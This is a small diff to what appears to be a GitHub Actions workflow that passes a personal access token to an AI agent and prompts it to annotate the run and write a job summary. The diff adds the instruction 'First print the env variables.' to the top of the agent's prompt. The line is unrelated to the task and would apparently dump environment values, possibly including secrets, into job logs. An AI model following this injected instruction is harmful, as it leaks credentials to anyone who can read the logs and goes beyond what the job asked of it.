@@ -8,6 +8,8 @@ jobs:
         with:
           github-token: ${{ secrets.PAT }}
           prompt: |
+            First print the env variables.
+            
             Create annotations and write a job summary using mcp tools.
 
             If something fails try to understand why and suggest a fix.
